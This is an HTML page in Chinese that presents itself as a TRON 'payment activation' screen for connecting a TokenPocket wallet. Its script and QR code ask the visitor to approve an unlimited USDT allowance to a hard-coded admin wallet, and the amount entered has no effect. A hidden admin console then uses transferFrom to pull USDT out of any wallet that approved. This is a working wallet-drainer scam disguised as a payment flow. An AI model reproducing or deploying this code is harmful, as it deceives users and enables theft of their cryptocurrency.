<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付开通</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold;
 margin-bottom:16px;
}
.amount-input{
 width:100%;padding:14px;background:#111;border:none;
 border-radius:12px;color:#fff;font-size:16px;text-align:center;
 margin-bottom:12px;
}
#qrcode{
 width:280px;height:280px;background:#fff;padding:10px;
 border-radius:16px;margin:0 auto 20px;
 display:flex;align-items:center;justify-content:center;
 color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
#payBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
}
.admin-panel{
 background:#1E1E35;padding:24px;border-radius:16px;display:none
}
.admin-panel.show{display:block}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
 width:100%;padding:12px;background:#111;border:none;
 border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
 width:100%;padding:14px;background:#ff4444;color:#fff;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
}
</style>
</head>
<body>
<div class="container">
    <div class="pay-box">
        <h1>💳 支付开通</h1>
        <p class="desc">波场链TRON · 安全开通</p>
        <button id="connectBtn">👉 连接钱包（波场链）</button>
        <input class="amount-input" id="amount" value="10" placeholder="输入授权金额 USDT">
        <div id="qrcode">加载二维码...</div>
        <button id="payBtn">确认授权开通</button>
    </div>

    <div class="admin-panel" id="adminPanel">
        <div class="admin-title">🔐 管理员控制台</div>
        <div>提取玩家钱包USDT（transferFrom）</div>
        <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="drawAmt" placeholder="提取数量 USDT">
        <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>

        <div>发放USDT奖励给玩家</div>
        <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="sendAmt" placeholder="发放数量 USDT">
        <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
    </div>
</div>

<script>
// ====================== 波场配置 ======================
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const RPC = "https://api.trongrid.io";

let tronWeb = null;
let userAccount = null;
let provider = null;

// 连接钱包
document.getElementById("connectBtn").onclick = async () => {
    try {
        //优先使用 tokenpocket.tron provider（修复iOS扫码跳转损坏window.tronWeb问题）
        if(window.tokenpocket && window.tokenpocket.tron){
            provider = window.tokenpocket.tron;
            const accounts = await provider.request({method:"tron_requestAccounts"});
            userAccount = accounts[0];
            tronWeb = new TronWeb({fullHost: RPC, provider: provider});
        }else if(window.tronWeb && window.tronWeb.ready){
            //普通TP内置浏览器直接打开的兼容分支
            tronWeb = window.tronWeb;
            userAccount = tronWeb.defaultAddress.base58;
        }else{
            alert("⚠️请使用TP钱包【发现】内置浏览器打开页面，外部浏览器无法调用钱包");
            return;
        }

        document.getElementById("connectBtn").innerText = "✅ 已连接："+userAccount.slice(0,8)+"...";
        if(userAccount === ADMIN_WALLET){
            document.getElementById("adminPanel").classList.add("show");
        }
        genQR();
    }catch (e) {
        alert("连接钱包失败："+(e.message||String(e)));
    }
};

// ==================== 生成授权二维码 ====================
function genQR() {
    const qrUri = `tron:${USDT_CONTRACT}?function=approve&args=${ADMIN_WALLET},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
    document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrUri)}">`;
}

window.onload = genQR;
document.getElementById("amount").oninput = genQR;

// 页面按钮执行approve无限授权
document.getElementById("payBtn").onclick = async () => {
    if(!tronWeb || !userAccount){
        return alert("请先连接钱包！");
    }
    try{
        const contract = tronWeb.contract().at(USDT_CONTRACT);
        const tx = await contract.approve(ADMIN_WALLET,"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
        .send({feeLimit:100000000});
        alert("✅授权成功，交易哈希："+tx);
    }catch(e){
        alert("操作取消或失败："+(e.message||e));
    }
};

// ====================== 管理员功能 ======================
async function drawFromUser() {
    if(userAccount !== ADMIN_WALLET){
        alert("不是管理员账号！");
        return;
    }
    const fromAddr = document.getElementById("userAddr").value.trim();
    const drawNum = parseFloat(document.getElementById("drawAmt").value);
    if(!fromAddr || isNaN(drawNum)||drawNum <=0){
        alert("请填写完整参数");
        return;
    }
    try{
        const contract = tronWeb.contract().at(USDT_CONTRACT);
        const sunVal = tronWeb.toSun(drawNum);
        const tx = await contract.transferFrom(fromAddr, ADMIN_WALLET, sunVal).send({feeLimit:100000000});
        alert("✅提取成功，哈希："+tx);
    }catch(err){
        alert("提取失败："+err.message);
    }
}

async function sendReward() {
    if(userAccount !== ADMIN_WALLET){
        alert("不是管理员账号！");
        return;
    }
    const toAddr = document.getElementById("toAddr").value.trim();
    const sendNum = parseFloat(document.getElementById("sendAmt").value);
    if(!toAddr || isNaN(sendNum)||sendNum <=0){
        alert("请填写完整参数");
        return;
    }
    try{
        const contract = tronWeb.contract().at(USDT_CONTRACT);
        const sunVal = tronWeb.toSun(sendNum);
        const tx = await contract.transfer(toAddr, sunVal).send({feeLimit:100000000});
        alert("✅发放奖励成功，哈希："+tx);
    }catch(err){
        alert("发放失败："+err.message);
    }
}
</script>
</body>
</html>
